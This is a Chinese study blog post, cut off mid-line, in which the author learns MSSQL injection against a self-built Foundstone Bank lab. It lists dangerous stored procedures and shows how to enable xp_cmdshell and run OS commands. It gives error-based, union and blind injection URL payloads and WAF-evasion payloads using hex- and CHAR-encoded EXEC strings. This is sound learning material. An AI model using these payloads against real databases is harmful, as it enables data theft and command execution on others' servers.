        <content type="html"><![CDATA[<p>来学习一下MSSQL相关的安全知识，不能只学MySQL</p><p>这里找到一位大佬的文章，跟着这个来逐步学习：<a href="https://github.com/aleenzz/MSSQL_SQL_BYPASS_WIKI">https://github.com/aleenzz/MSSQL_SQL_BYPASS_WIKI</a></p><h1><span id="mssql介绍">MSSQL介绍</span></h1><p><strong>简介</strong></p><p>MSSQL也叫Microsoft SQL Server。</p><p>SQL Server是由Microsoft开发和推广的**关系数据库管理系统(DBMS)**；</p><p>SQL Server使用方便，伸缩性好与相关软件集成程度高；</p><p>SQL Server 数据库引擎为关系型数据和结构化数据提供了更安全可靠的存储功能。</p><p><strong>SQL Server各服务作用</strong></p><ul><li>SQL Server(MSSQLSERVER)是必须要开启的，这个是数据库引擎服务，它就像汽车的发动机一样，缺它不可。</li><li>SQL Server代理(MSSQLSERVER)是代理服务，比如你有一些自动运行的，定时作业，或者是一些维护计划，比如定时备份数据库等操作，那么就要打开，否则，就不会备份数据库了。 </li><li>SQL Server Analysis Services (MSSQLSERVER)是分析服务，一般不用开启，除非你做多位分析，和数据挖掘，才需要开启。</li><li>SQL Full-text Filter Daemon Launcher (MSSQLSERVER)是全文检索服务，如果你没有使用全文检索技术，那么也不需要开启。 </li><li>SQL Server VSS Writer MicrosoftSQLServer的SQL编写器服务，允许备份和还原应用程序以便在VolumeShadowCopyService(VSS)框架中进行操作。</li><li>Sql Browser 服务 一般你要进行远程访问，不需要开启sql browser，通过：服务器ip,端口 这种方式就可以访问远程的服务器。</li></ul><p>下面安装MSSQL2008的版本用来学习。</p><h1><span id="mssql基础知识">MSSQL基础知识</span></h1><h2><span id="一些默认库">一些默认库</span></h2><ul><li>master   &#x2F;&#x2F;用于记录所有SQL Server系统级别的信息，这些信息用于控制用户数据库和数据操作。</li><li>model    &#x2F;&#x2F;SQL Server为用户数据库提供的样板，新的用户数据库都以model数据库为基础</li><li>msdb     &#x2F;&#x2F;由 Enterprise Manager和Agent使用，记录着任务计划信息、事件处理信息、数据备份及恢复信息、警告及异常信息</li><li>tempdb   &#x2F;&#x2F;它为临时表和其他临时工作提供了一个存储区。</li></ul><blockquote><p>sqlserver使用的两个端口，TCP-1433，UDP-1434</p><p>mssql注入常要打交道的库也就是 master，其中储存了所有数据库名与存储过程。类比于 MySQL 中的 <code>information_schema</code> 元数据库</p><p>权限:2008之前，为system、2008及其以后权限不再为system</p></blockquote><p><img src="http://cdn.clown2024.cn/202407151441327.png" alt="image-20240404103930739"></p><p>下面命令可以查询所有数据库名：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">select name from master.dbo.sysdatabases;<br>select name from master.sys.databases;<br>//sqlserver2005之后sysdatabases变成sys.databases存放在视图中<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151441328.png" alt="image-20240404104149872"></p><p><img src="http://cdn.clown2024.cn/202407151441329.png" alt="image-20240404104216061"></p><p>下列命令用来查询对象名及其类型：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">select top 100 name,xtype from sysobjects;//从当前数据库的 sysobjects 系统表中选择前 100 行的 name 和 xtype 列数据<br>//但是在sys.objects中xtype为type<br>select top 100 name,type from sys.objects;<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151441330.png" alt="image-20240404105226387"></p><p><img src="http://cdn.clown2024.cn/202407151441331.png" alt="image-20240404105705167"></p><p>下面是一些在 SQL Server 中用于描述对象类型的缩写或标识符。它们通常在系统表中使用，以区分不同种类的数据库对象。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">C = CHECK 约束：表示一个表的检查约束，用于确保满足特定条件的数据才能插入到表中。<br>D = 默认值或 DEFAULT 约束：表示对列的默认值约束，用于在插入新行时为列提供默认值。<br>F = FOREIGN KEY 约束：表示外键约束，用于维护表与表之间的引用完整性。<br>L = 日志：表示数据库的事务日志，用于记录数据库的更新操作，以确保事务的持久性和一致性。<br>FN = 标量函数：表示标量函数，它返回单个值。<br>IF = 内嵌表函数：表示内联表值函数，它能返回一个包含多行的结果集。<br>P = 存储过程：表示数据库中的存储过程，包含了可复用的、预编译的 SQL 代码块。<br>PK = PRIMARY KEY 约束（类型是 K）：表示主键约束，用于唯一标识表中的每一行记录。<br>RF = 复制筛选存储过程：这是与 SQL Server 复制功能相关的对象，用于筛选要复制的数据。<br>S = 系统表：表示数据库系统表，用于存储数据库元数据信息的特殊表。<br>TF = 表函数：表示表值函数，它可以返回一个表示为表格的结果集。<br>TR = 触发器：表示数据库中的触发器，用于定义在表上执行的自动化操作。<br>U = 用户表：表示用户创建的表，用于存储实际数据。<br>UQ = UNIQUE 约束（类型是 K）：表示唯一约束，用于确保列或列组合中的值是唯一的。<br>V = 视图：表示数据库中的视图，提供了对一个或多个基本表的结构化访问。<br>X = 扩展存储过程：表示扩展存储过程，这是一种特殊的存储过程类型。<br></code></pre></td></tr></table></figure><p><strong>存储过程</strong></p><blockquote><p>储存过程是一个可编程的函数，它在数据库中创建并保存。它可以有SQL语句和一些特殊的控制结构组成。当希望在不同的应用程序或平台上执行相同的函数，或者封装特定功能时，存储过程是非常有用的。数据库中的存储过程可以看做是对编程中面向对象方法的模拟。它允许控制数据的访问方式。</p><p>可以理解为一个函数调用的过程</p></blockquote><p><strong>常用的危险存储过程及其作用</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">xp_cmdshell：执行操作系统命令的存储过程，可用于在 SQL Server 上运行命令行命令。<br><br>xp_dirtree：在指定目录下列出所有目录及子目录的文件夹结构。<br><br>xp_enumgroups：用于列举系统中的所有用户组。<br><br>xp_fixeddrives：返回计算机上所有磁盘驱动器的信息。<br><br>xp_loginconfig：显示有关 SQL Server 登录的配置信息。<br><br>xp_enumerrorlogs：列出系统错误日志的内容。<br><br>xp_getfiledetails：返回文件的详细信息，如路径、大小、创建日期等。<br><br>Sp_OACreate：用于创建一个新的OLE Automation 对象。<br><br>Sp_OADestroy：释放先前创建的OLE Automation 对象。<br><br>Sp_OAGetErrorInfo：获取关于上一次调用的错误信息。<br><br>Sp_OAGetProperty：获取一个OLE Automation 对象的属性值。<br><br>Sp_OAMethod：调用一个OLE Automation 对象的方法。<br><br>Sp_OASetProperty：设置一个OLE Automation 对象的属性值。<br><br>Sp_OAStop：停止OLE Automation 对象的执行。<br><br>Xp_regaddmultistring：向注册表中指定项添加名称和数据。<br><br>Xp_regdeletekey：删除指定的注册表项及其所有子项。<br><br>Xp_regdeletevalue：删除指定的注册表项中的指定值。<br><br>Xp_regenumvalues：返回指定注册表项的值名称列表。<br><br>Xp_regread：返回指定注册表项的指定值的数据。<br><br>Xp_regremovemultistring：从注册表中指定的项中移除一个或多个多字符串值。<br><br>Xp_regwrite：将数据写入指定的注册表项。<br><br>sp_makewebtask：生成用于在 SQL Server 上导出数据的命令。<br><br>sp_configure:  用于查看和更改服务器配置选项<br></code></pre></td></tr></table></figure><h2><span id="一些字符">一些字符</span></h2><p><strong>注释符</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">/**/<br>--<br>;%00 //emm这个我试不出来，不知道是不是在网页得时候才有用，因为%00出来是NULL<br></code></pre></td></tr></table></figure><p><strong>空白符</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">01,02,03,04,05,06,07,08,09,0A,0B,0C,0D,0E,0F,10,11,12,13,14,15,16,17,18,19,1A,1B,1C,1D,1E,1F,20<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151441332.png" alt="image-20240404111658741"></p><p><strong>特殊一点的运算符</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">ALL 如果一组的比较都为true，则比较结果为true<br><br>AND 如果两个布尔表达式都为true，则结果为true；如果其中一个表达式为false，则结果为false<br><br>ANY 如果一组的比较中任何一个为true，则结果为true<br><br>BETWEEN 如果操作数在某个范围之内，那么结果为true<br><br>EXISTS  如果子查询中包含了一些行，那么结果为true<br><br>IN  如果操作数等于表达式列表中的一个，那么结果为true<br><br>LIKE    如果操作数与某种模式相匹配，那么结果为true<br><br>NOT 对任何其他布尔运算符的结果值取反<br><br>OR  如果两个布尔表达式中的任何一个为true，那么结果为true<br><br>SOME    如果在一组比较中，有些比较为true，那么结果为true<br></code></pre></td></tr></table></figure><p><strong>语法定义符号</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt; &gt; 尖括号，用于分隔字符串，字符串为语法元素的名称，SQL语言的非终结符。<br><br><br>::= 定义操作符。用在生成规则中，分隔规则定义的元素和规则定义。 被定义的元素位于操作符的左边，规则定义位于操作符的右边。<br><br><br>[ ] 方括号表示规则中的可选元素。方括号中的规则部分可以明确指定也可以省略。<br><br><br>&#123; &#125; 花括号聚集规则中的元素。在花括号中的规则部分必须明确指定。<br><br><br>() 括号是分组运算符<br></code></pre></td></tr></table></figure><h2><span id="常用函数">常用函数</span></h2><ol><li>聚合函数：<ul><li><code>SUM()</code>：计算某列的总和。</li><li><code>COUNT()</code>：计算某列的行数。</li><li><code>AVG()</code>：计算某列的平均值。</li><li><code>MIN()</code>：找到某列的最小值。</li><li><code>MAX()</code>：找到某列的最大值。</li></ul></li><li>字符串函数：<ul><li><code>LEN()</code>：返回字符串的长度。</li><li><code>UPPER()</code>：将字符串转换为大写。</li><li><code>LOWER()</code>：将字符串转换为小写。</li><li><code>SUBSTRING()</code>：提取部分字符串。</li><li><code>CONCAT()</code>：将多个字符串连接在一起。</li><li><code>ASCII()</code>:   将字符转换成对应的ASCII码</li><li>char():   将ASCII转换成对应的字符</li></ul></li><li>日期和时间函数：<ul><li><code>GETDATE()</code>：返回当前日期和时间。</li><li><code>DATEPART()</code>：返回日期或时间部分的值（如年、月、日、小时、分钟等）。</li><li><code>DATEDIFF()</code>：计算两个日期之间的差值。</li><li><code>DATEADD()</code>：在日期上添加或减去指定的时间间隔。</li></ul></li><li>数学函数：<ul><li><code>ABS()</code>：返回数值的绝对值。</li><li><code>ROUND()</code>：将数值四舍五入到指定的小数位数。</li><li><code>FLOOR()</code>：返回不大于指定数值的最大整数。</li><li><code>CEILING()</code>：返回不小于指定数值的最小整数。</li><li><code>POWER()</code>：计算一个数的指定次幂。</li></ul></li><li>逻辑函数：<ul><li><code>IF()</code> 或 <code>IIF()</code>：根据条件返回不同的值。</li><li><code>CASE</code> 表达式：根据条件选择不同的结果。</li></ul></li></ol><p>mssql还有一个特有的函数用来延迟一段时间，mysql则是用sleep</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">-- 延迟 5 秒<br>WAITFOR DELAY &#x27;00:00:05&#x27;<br><br>-- 延迟 2.5 秒<br>WAITFOR DELAY &#x27;00:00:02.500&#x27;<br></code></pre></td></tr></table></figure><h1><span id="信息搜集">信息搜集</span></h1><p><strong>基本信息</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">@@version  //数据库版本<br>@@servername //主机名<br>user  //当前数据库用户名<br>db_name()  //当前数据库名<br>;select user  //查询是否支持多语句<br>SUSER_SNAME() //当前会话登录的用户名<br>ORIGINAL_LOGIN()  //返回最初执行当前批处理或触发器的登录名<br>current_user()  //当前数据库用户<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151441333.png" alt="image-20240404112105796"></p><p><strong>判断是否站库分离</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">select * from info where id=&#x27;1&#x27;and host_name()=@@servername;--&#x27;<br>//host_name()表示客户端主机名<br>//@@servername表示服务端主机名<br>//如果为true则表示没有分离，通过比较这两个值，可以确定查询正在运行的数据库服务器是否同时包含应用程序服务器和数据库服务器。<br></code></pre></td></tr></table></figure><p>或者可以通过xp_cmshell来判断，这里先开启xp_cmdshell</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">sp_configure &#x27;show advanced options&#x27;, 1;<br>reconfigure;<br>GO<br>sp_configure &#x27;xp_cmdshell&#x27;, 1;<br>RECONFIGURE;<br>GO<br>xp_cmdshell &quot;whoami&quot;;<br>//或者 exec xp_cmdshell &quot;whoami&quot;;<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151441334.png" alt="image-20240404122902796"></p><blockquote><p>xp_cmdshell是默认关闭的为0，需要先开启它才行</p><p>使用sp_cocnfigure 可以修改服务器配置</p><p><img src="http://cdn.clown2024.cn/202407151441335.png" alt="image-20240404123145991"></p></blockquote><p>我们通过使用xp_cmdshell就可以判断出当前用户的权限，比如MSSQL2005的权限一般是system 而2008是nt authority\network service，在上图中也有显示。</p><p><strong>判断当前是否为mssql</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">select * from sysobjects;<br>//因为sysobjects为MSSQL中独有的数据表，返回正常即可表示为MSSQL<br>//sysobjects相当于master.sys.objects<br></code></pre></td></tr></table></figure><p><strong>权限判断</strong></p><p><code>IS_SRVROLEMEMBER(&#39;role&#39; [, &#39;login&#39;])</code> 函数是 SQL Server 中的一个内置函数，用于检查指定登录名（login）是否属于指定的服务器角色（role），不指定用户名就默认当前登录用户名。用来判断服务器角色</p><p><img src="http://cdn.clown2024.cn/202407151441336.png" alt="image-20240404142324755"></p><p>下面是一些固定角色：</p><table><thead><tr><th align="left">服务器级的固定角色</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">sysadmin</td><td align="left">sysadmin 固定服务器角色的成员可以在服务器上执行任何活动。</td></tr><tr><td align="left">serveradmin</td><td align="left">serveradmin 固定服务器角色的成员可以更改服务器范围的配置选项和关闭服务器。</td></tr><tr><td align="left">securityadmin</td><td align="left">securityadmin 固定服务器角色的成员可以管理登录名及其属性。 他们可以 <code>GRANT</code>、<code>DENY</code> 和 <code>REVOKE</code> 服务器级权限。 他们还可以 <code>GRANT</code>、<code>DENY</code> 和 <code>REVOKE</code> 数据库级权限（如果他们具有数据库的访问权限）。 此外，他们还可以重置 SQL Server 登录名的密码。 重要说明： 如果能够授予对 数据库引擎 的访问权限和配置用户权限，安全管理员可以分配大多数服务器权限。 securityadmin 角色应视为与 sysadmin 角色等效。</td></tr><tr><td align="left">processadmin</td><td align="left">processadmin 固定服务器角色的成员可以终止在 SQL Server 实例中运行的进程。</td></tr><tr><td align="left">setupadmin</td><td align="left">setupadmin 固定服务器角色的成员可以使用 Transact-SQL 语句添加和删除链接服务器。 （使用 Management Studio 时需要 sysadmin 成员资格。）</td></tr><tr><td align="left">bulkadmin</td><td align="left">bulkadmin 固定服务器角色的成员可以运行 <code>BULK INSERT</code> 语句。</td></tr><tr><td align="left">diskadmin</td><td align="left">diskadmin 固定服务器角色用于管理磁盘文件。</td></tr><tr><td align="left">dbcreator</td><td align="left">dbeator 固务器角色的成员可以创建、更改、删除和还原任何数据库。</td></tr><tr><td align="left">puic</td><td align="left">每个 SQL Server 登录名都属于 public 服务器角色。 如果未向某个服务器主体授予或拒绝对某个安全对象的特定权限，该用户将继承授予该对象的 public 角色的权限。 只有在希望所有用户都能使用对象时，才在对象上分配 Public 权限。 你无法更改具有 Public 角色的成员身份。 注意plic 与其他角色的实现方式不同，可通过 public 固定服务器角色授予、拒绝或调用权限。</td></tr></tbody></table><p>数据库级别角色使用<code>IS_MEMBER(&#39;role&#39;)来判断</code></p><table><thead><tr><th align="left">固定数据库角色名</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">db_owner</td><td align="left">db_owner 固定数据库角色的成员可以执行数据库的所有配置和维护活动，还可以删除 SQL Server中的数据库。 （在 SQL 数据库 和 SQL 数据仓库中，某些维护活动需要服务器级别权限，并且不能由 db_owners执行。）</td></tr><tr><td align="left">db_securityadmin</td><td align="left">db_securityadmin 固定数据库角色的成员可以仅修改自定义角色的角色成员资格、创建无登录名的用户和管理权限。 向此角色中添加主体可能会导致意外的权限升级。</td></tr><tr><td align="left">db_accessadmin</td><td align="left">db_accessadmin 固定数据库角色的成员可以为 Windows 登录名、Windows 组和 SQL Server 登录名添加或删除数据库访问权限。</td></tr><tr><td align="left">db_backupoperator</td><td align="left">db_backupoperator 固定数据库角色的成员可以备份数据库。</td></tr><tr><td align="left">db_ddladmin</td><td align="left">db_ddladmin 固定数据库角色的成员可以在数据库中运行任何数据定义语言 (DDL) 命令。</td></tr><tr><td align="left">db_datawriter</td><td align="left">db_datawriter 固定数据库角色的成员可以在所有用户表中添加、删除或更改数据。</td></tr><tr><td align="left">db_datareader</td><td align="left">db_datareader 固定数据库角色的成员可以从所有用户表中读取所有数据。</td></tr><tr><td align="left">db_denydatawriter</td><td align="left">db_denydatawriter 固定数据库角色的成员不能添加、修改或删除数据库内用户表中的任何数据。</td></tr><tr><td align="left">db_denydatareader</td><td align="left">db_denydatareader 固定数据库角色的成员不能读取数据库内用户表中的任何数据。</td></tr></tbody></table><p>返回类型:</p><table><thead><tr><th>返回值</th><th>描述</th></tr></thead><tbody><tr><td>0</td><td>login 不是 role 的成员。</td></tr><tr><td>1</td><td>login 是 role 的成员。</td></tr><tr><td>NULL</td><td>role 或 login 无效，或者没有查看角色成员身份的权限。</td></tr></tbody></table><h1><span id="mssql注入流程">MSSQL注入流程</span></h1><p>由于网上没有现成靶场需要自己搭一个测试，参考文章：<a href="https://macchiato.ink/web/web_security/mssql_injection_setup/#0x03-web%E6%9C%8D%E5%8A%A1%E5%AE%89%E8%A3%85">https://macchiato.ink/web/web_security/mssql_injection_setup/#0x03-web%E6%9C%8D%E5%8A%A1%E5%AE%89%E8%A3%85</a></p><blockquote><p>开iis的时候记得要勾选.net扩展不然解析不了</p></blockquote><p>最后搭好大概就是这样</p><p><img src="http://cdn.clown2024.cn/202407151441337.png" alt="image-20240404151819506"></p><p><strong>注入流程</strong></p><ol><li>获取数据库名</li><li>获取数据库的表名</li><li>获取数据库的字段名</li><li>获取对应的数据</li></ol><h2><span id="主要系统表">主要系统表</span></h2><ol><li>sysdatabases :这张表保存在master数据库中，里边的name字段下存放的是所有数据库的库名。 </li><li>sysobjects：这张表保存的是数据库的表的信息，里边的id字段存放的是表的id，name为表名，xtype 字段存放的是表的类型，u代表为用户创建的表，s表示该表是系统表。</li><li>syscolumns：这张表存放的是数据库中字段的信息，id 为表的id，该id可以通过sysobjects获得。name为字段名称。</li></ol><h1><span id="报错注入">报错注入</span></h1><h2><span id="获取数据库名">获取数据库名</span></h2><p><strong>利用db_name()来获取</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">?user_id=1 union select 1,db_name(),NULL,NULL,NULL<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151441338.png" alt="image-20240404154924142"></p><p>还可以使其报错来获取库名</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">?user_id=1 and db_name()&gt;0<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151441339.png" alt="image-20240404155032112"></p><h2><span id="爆表名">爆表名</span></h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">?user_id=1 and 1=(select top 1 name from sysobjects where xtype=&#x27;u&#x27;)<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151441340.png" alt="image-20240404160254630"></p><h2><span id="爆列名">爆列名</span></h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">?user_id=1 and 1=(select top 1 name from syscolumns where id=(select id from sysobjects where name = &#x27;fsb_messages&#x27;) and name&lt;&gt;&#x27;id&#x27;);--<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151441341.png" alt="image-20240404164654710"></p><h2><span id="爆数据">爆数据</span></h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">?user_id=1 union select top 1 message_id,NULL,NULL,NULL,NULL from fsb_messages<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151441342.png" alt="image-20240405004846596"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">?user_id=1 union select%20 message_id,NULL,NULL,NULL,NULL from fsb_messages<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151441343.png" alt="image-20240405004940238"></p><blockquote><p>报错注入只能查询一个一个值，但是mssql没有limit这种东西，就只能用top加上判断来遍历数据。</p></blockquote><p>但是这里的message_id和数字类型一样就要换其他类型来进行报错回显，但是试了一下发现不行，应该要是查询的那部分出错才会显示出来</p><p><img src="http://cdn.clown2024.cn/202407151441344.png" alt="image-20240405005556182"></p><p>但是当联合查询可用又知道列数时可以直接像上面一样全部查出，可以利用order by来判断列数。</p><p><img src="http://cdn.clown2024.cn/202407151441345.png" alt="image-20240405005134075"></p><p>order by 5不报错证明就有5列数据。</p><h2><span id="显式转换报错">显式转换报错</span></h2><p>上面的都是隐式转换类型来报错获得信息，mssql中还有两个函数用于显式转换</p><figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-built_in">CAST</span>( expression <span class="hljs-keyword">AS</span> data_type )<br><br><span class="hljs-keyword">CONVERT</span>(data_type[(length)], expression [, style])<br><br></code></pre></td></tr></table></figure><p>下面拿一个varchar数据来进行示例</p><figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql">?user_id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span>(<span class="hljs-keyword">select</span> top <span class="hljs-number">1</span> <span class="hljs-keyword">convert</span>(<span class="hljs-type">int</span>,text) <span class="hljs-keyword">from</span> fsb_messages)<br>?user_id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span>(<span class="hljs-keyword">select</span> top <span class="hljs-number">1</span> <span class="hljs-built_in">cast</span>(text <span class="hljs-keyword">as</span> <span class="hljs-type">int</span>) <span class="hljs-keyword">from</span> fsb_messages)<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151441346.png" alt="image-20240405105044697"></p><p><img src="http://cdn.clown2024.cn/202407151441347.png" alt="image-20240405105134618"></p><h1><span id="联合注入">联合注入</span></h1><p>联合注入前先使用order by判断列数，上面有提到过。</p><p>查询的时候如果发现数据类型不兼容可以用NULL替换。</p><h2><span id="获取数据库名">获取数据库名</span></h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">?user_id=1 union all select NULL,name COLLATE Chinese_PRC_CI_AS,NULL,NULL,NULL from master..sysdatabases<br>//表明还可以这样子写法学到了<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151441348.png" alt="image-20240405013223845"></p><blockquote><p>这里除了数据类型要一样每个列的排序规则也要一样不然会报错，上面的COLLATE就是用来转换排序规则的，不转换就会报下面的错误</p><p><img src="http://cdn.clown2024.cn/202407151441349.png" alt="image-20240405013414465"></p></blockquote><h2><span id="获取数据库表名">获取数据库表名</span></h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">?user_id=1 union select NULL,name COLLATE Chinese_PRC_CI_AS,NULL,NULL,NULL from FoundStone_Bank..sysobjects where xtype=&#x27;u&#x27;<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151441350.png" alt="image-20240405013831956"></p><h2><span id="获取指定表的字段名">获取指定表的字段名</span></h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">?user_id=1 union select NULL,name COLLATE Chinese_PRC_CI_AS,NULL,NULL,NULL from FoundStone_Bank..syscolumns where id=(select id from FoundStone_Bank..sysobjects where name=&#x27;fsb_accounts&#x27;)<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151441351.png" alt="image-20240405014311541"></p><h2><span id="获取字段具体的值">获取字段具体的值</span></h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">?user_id=1 union select account_no,NULL,NULL,NULL,NULL from fsb_accounts<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151441352.png" alt="image-20240405014506811"></p><h1><span id="盲注">盲注</span></h1><h2><span id="判断数据库个数">判断数据库个数</span></h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">?user_id=1 and (select count(*) from master..sysdatabases) &gt; 7<br>?user_id=1 and (select count(*) from master..sysdatabases) &gt; 6<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151441353.png" alt="image-20240405103329682"></p><p><img src="http://cdn.clown2024.cn/202407151441354.png" alt="image-20240405103353807"></p><h2><span id="获取数据库信息">获取数据库信息</span></h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">?user_id=1 and substring(db_name(),1,1)=char(106)<br></code></pre></td></tr></table></figure><p>类似mysql盲注一样，遍历字符的布尔盲注</p><p><img src="http://cdn.clown2024.cn/202407151441355.png" alt="image-20240405103706224"></p><p>其余的查询就不写了，在上面的联合注入中一个字符一个字符遍历即可</p><h1><span id="简单的绕过注入">简单的绕过注入</span></h1><p>这里介绍一个<strong>declare</strong>函数，他是mssql声明局部变量的函数，可以用它来绕过waf对一些关键词的拦截。</p><p><strong>一般语法</strong></p><figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">DECLARE</span> <span class="hljs-variable">@variable_name</span> [<span class="hljs-keyword">AS</span>] data_type [ <span class="hljs-operator">=</span> initial_value];<br></code></pre></td></tr></table></figure><p>可以给变量赋初始值，也可以不赋值。</p><p><strong>声明多个变量</strong></p><figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">DECLARE</span> <span class="hljs-variable">@age</span> <span class="hljs-type">INT</span>, <span class="hljs-variable">@salary</span> <span class="hljs-type">DECIMAL</span>(<span class="hljs-number">10</span>, <span class="hljs-number">2</span>), <span class="hljs-variable">@isEmployed</span> BIT; #BIT表示布尔类型<br></code></pre></td></tr></table></figure><p><strong>用法示例</strong></p><figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">declare</span> <span class="hljs-variable">@test</span> <span class="hljs-type">varchar</span>(<span class="hljs-number">50</span>);<br><span class="hljs-keyword">select</span> <span class="hljs-variable">@test</span><span class="hljs-operator">=</span>(<span class="hljs-keyword">select</span> top <span class="hljs-number">1</span> subject <span class="hljs-keyword">from</span> fsb_messages);<br><span class="hljs-keyword">select</span> <span class="hljs-variable">@test</span>;<br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> fsb_messages;<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151441356.png" alt="image-20240405110119279"></p><figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">declare</span> <span class="hljs-variable">@test</span> <span class="hljs-type">varchar</span>(<span class="hljs-number">50</span>);<br><span class="hljs-keyword">select</span> <span class="hljs-variable">@test</span><span class="hljs-operator">=</span><span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>) <span class="hljs-keyword">from</span> fsb_messages;<br><span class="hljs-keyword">select</span> <span class="hljs-variable">@test</span>;<br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> fsb_messages;<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151441357.png" alt="image-20240405110616058"></p><p><strong>绕过示例</strong></p><figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql">?user_id<span class="hljs-operator">=</span><span class="hljs-number">1</span>;<span class="hljs-keyword">declare</span> <span class="hljs-variable">@a</span> nvarchar(<span class="hljs-number">2000</span>) <span class="hljs-keyword">set</span> <span class="hljs-variable">@a</span><span class="hljs-operator">=</span><span class="hljs-string">&#x27;select convert(int,@@version)&#x27;</span> <span class="hljs-keyword">exec</span>(<span class="hljs-variable">@a</span>)<br>#<span class="hljs-keyword">declare</span>定义变量 <span class="hljs-keyword">set</span>设置变量值 <span class="hljs-keyword">exec</span>执行变量<br></code></pre></td></tr></table></figure><p>嘶怪了，在浏览网页的时候不报错，单独测试了一下每个命令都是执行了的啊，而且在SSMS中又是有效的，不知道为啥。</p><p><img src="http://cdn.clown2024.cn/202407151441358.png" alt="image-20240405112351188"></p><p>变量的值是支持hex和ascii码的,当过滤引号时可以把我们的语句编码一下</p><figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">declare</span> <span class="hljs-variable">@s</span> <span class="hljs-type">varchar</span>(<span class="hljs-number">2000</span>) <span class="hljs-keyword">set</span> <span class="hljs-variable">@s</span><span class="hljs-operator">=</span><span class="hljs-number">0x73656c65637420636f6e7665727428696e742c404076657273696f6e29</span> <span class="hljs-keyword">exec</span>(<span class="hljs-variable">@s</span>)<br><span class="hljs-keyword">declare</span> <span class="hljs-variable">@s</span> <span class="hljs-type">varchar</span>(<span class="hljs-number">2000</span>) <span class="hljs-keyword">set</span> <span class="hljs-variable">@s</span><span class="hljs-operator">=</span> <span class="hljs-type">CHAR</span>(<span class="hljs-number">115</span>) <span class="hljs-operator">+</span> <span class="hljs-type">CHAR</span>(<span class="hljs-number">101</span>) <span class="hljs-operator">+</span> <span class="hljs-type">CHAR</span>(<span class="hljs-number">108</span>) <span class="hljs-operator">+</span> <span class="hljs-type">CHAR</span>(<span class="hljs-number">101</span>) <span class="hljs-operator">+</span> <span class="hljs-type">CHAR</span>(<span class="hljs-number">99</span>) <span class="hljs-operator">+</span> <span class="hljs-type">CHAR</span>(<span class="hljs-number">116</span>) <span class="hljs-operator">+</span> <span 